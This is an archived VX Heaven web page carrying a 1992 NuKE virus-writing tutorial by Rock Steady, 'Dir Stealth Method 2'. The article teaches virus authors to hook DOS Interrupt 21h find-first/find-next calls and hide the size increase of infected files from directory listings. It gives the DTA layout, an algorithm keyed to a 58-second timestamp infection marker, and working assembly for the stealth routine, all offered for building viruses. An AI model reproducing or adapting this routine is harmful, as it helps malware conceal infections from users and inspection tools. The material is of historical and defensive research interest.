<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Rock Steady 'Dir Stealth Method 2' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Rock Steady"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rock Steady,Dir Stealth Method 2, call, file, infected, method, asciiz, stealth, routine, seconds, push, size, good, find, step, field, check"/>
<meta name="Description" content="Some May notice that when they use PCTOOLs (aka PCSHELL) or Peter Norton Utilities, or *SOME* File Managing systems like DOS-Shell, the File increase of infected files is know visable. There is no doubt about it, if you only put Method #1 in your virus you will encounter times were the file increase shows. Its not because your Routine isn't good! But due to the fact that there is another way to Read the Dir Listing by DOS. An this method is Call File-find by ASCIIZ format.We just learned how to edit File-Find by FCB. Which is used by MS-DOS PC-DOS and some other programs. But unlike the others, they use the ASCIIZ file-Find method as it is EASIER to open, close, edite, and any other file access routine is ALOT easier with the ASCIIZ or (File Handle) system. So we will make our Virus Stealth to Method #2! Making us 100% Stealth from file-finds..."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c43a90a0f527b496669ca83bdab3756a6714626b-1498756101-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrs03.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Dir Stealth Method 2</h1><p><a href="/lib/?lang=en&amp;author=Rock%20Steady"> Rock Steady</a><br/> <em><a href="/vx.php?fid=338#f338">Nuke Info Journal [4]</a></em><br/> <em>August 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrs03.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs03">Back to index</a>] [<a href="/lib/vrs03.html#disqus_thread">Comments</a>]<br/> 
<p>Some May notice that when they use PCTOOLs (aka PCSHELL) or Peter Norton Utilities, or *SOME* File Managing systems like DOS-Shell, the File increase of infected files is know visable. There is no doubt about it, if you only put Method #1 in your virus you will encounter times were the file increase shows. Its not because your Routine isn't good! But due to the fact that there is another way to Read the Dir Listing by DOS. An this method is Call File-find by ASCIIZ format.</p>
<p>We just learned how to edit File-Find by FCB. Which is used by MS-DOS PC-DOS and some other programs. But unlike the others, they use the ASCIIZ file-Find method as it is EASIER to open, close, edite, and any other file access routine is ALOT easier with the ASCIIZ or (File Handle) system. So we will make our Virus Stealth to Method #2! Making us 100% Stealth from file-finds...</p>
<p>The Function we have to Intecept is Interrupt 21h, with Functions AH=4Eh (Find First Matching File) and AH=4F (Find Next Matching File) The Way to go about it is Very much ALIKE to the first one, so just understand the thoery, and you'll be able to program it within seconds.</p>
<p>When this function is called, it will fill the current DTA with 12 entries totally 43 bytes. The DTA will be set up as follows: (below) BTW: DTA is only a place DOS uses to do Disk Transfer Areas! It ISN'T like the FCB, or PSP that is anyways the same! You can play with this as you wish. You also use this DTA to read the Command Line Parameters... etc...</p>
<table border="1" cellspacing="0" cellpadding="0" summary="">
<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
<tr><td>00h </td><td>1 </td><td>Drive Letter</td></tr>
<tr><td>01h </td><td>11</td><td>Seach Template (Eg:????????COM)</td></tr>
<tr><td>0Ch </td><td>1 </td><td>Attribute Search</td></tr>
<tr><td>0Dh </td><td>2 </td><td>Entry count within Directory</td></tr>
<tr><td>0Fh </td><td>2 </td><td>Cluster Number of start of parent directory</td></tr>
<tr><td>11h </td><td>4 </td><td>Reserved (Atleast Undocumented)</td></tr>
<tr><td>15h </td><td>1 </td><td>Attribute of File FOUND</td></tr>
<tr><td>@16h</td><td>2 </td><td>File's Time (Bits : SSSS-SMMM-MMMH-HHHH) Sec/2:Month:Year</td></tr>
<tr><td>18h </td><td>2 </td><td>File's Date (Bits : DDDD-DMMM-MYYY-YYYY) Day:Month:Year</td></tr>
<tr><td>*1Ah</td><td>4 </td><td>File's Size (Word Reverse Order, Dah!!?!)</td></tr>
<tr><td>1Eh </td><td>13</td><td>ASCIIZ File name &amp; Extension</td></tr>
</table>
<p><em>* = Must be Edited by Virus is File Infected</em></p>
<p><em>@ = Needed to Check if File is Infected. (Seconds Field)</em></p>
<h2>Algorthm</h2>
<p>CONDISTION: DS:DX points to ASCIIZ of file search. CX: Contains File Attributes</p>
<p>Step 1. Call Dos so it fills the DTA with its findings</p>
<p>Step 2. Test for CF=1 (Carry Flag) as error happened errors happen if File not found, no more files etc...</p>
<p>Step 3. Get Seconds Field And UnMask Seconds</p>
<p>Step 4. Check if seconds = 58 (What ever your using) Quit if NOT Notice we use `XOR AL,1Dh' rather than `CMP AL,1Dh' Check in your ASM Bible, which is Faster? Size? Remember speed &amp; size is EVERYTHING, That is why My lastest are quite small viriis for stealthness!!</p>
<p>Step 5. If Infected Subtract Virus Size from File</p>
<p>Step 6. Quit</p>
<pre class="source">
 ;This is the routine. once you get AH=4Eh/4Fh in you Int 21h Call this
 ;Routine...  (Look at Method #1 for Int21h handler)
 Dir_Stealth2
         pushf                        ;Fake an Int Call
         push    cs                   ;Save our location
         call    int21Call            ;Step #1
         jc      no_good              ;Error Split
         push    ax
         push    bx
         push    es
         mov     ah,51h               ;Get Current DTA
         int     21h                  ;ES:BX --&gt; DTA

         mov     ax,es:[bx+16h]       ;Get File Time
         and     ax,1fh               ;Un Mask Seconds field
         xor     al,1dh               ;Is it 58 Seconds?
         jnz     not_infected         ;Not infected! Dah?
         sub     es:[bx+1Ah],Virus_Size ;Minus Virus Size!
         sbb     es:[bx+1Ch],0          ;Fix up the Sub, Carrying!
 not_infected:
         pop     es
         pop     bx                   ;Restore Registers
         pop     ax
 no_Good:iret
 ; This code WORKS and is also 100% (c) Rock Steady / NuKE
 ;--------------------------EnD-------------------------------
</pre>
<pre>
                            Rock Steady
         `WaTch OuT WaReZ PuPpiEs NuKE PoX V2.0 WiLl GeTcHa'
</pre>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrs03">de</a><a href="/lib/index.php?lang=en&amp;id=vrs03">en</a><a href="/lib/index.php?lang=es&amp;id=vrs03">es</a><a href="/lib/index.php?lang=it&amp;id=vrs03">it</a><a href="/lib/index.php?lang=fr&amp;id=vrs03">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrs03">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrs03">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrs03">ua</a></div>
</body>
</html>
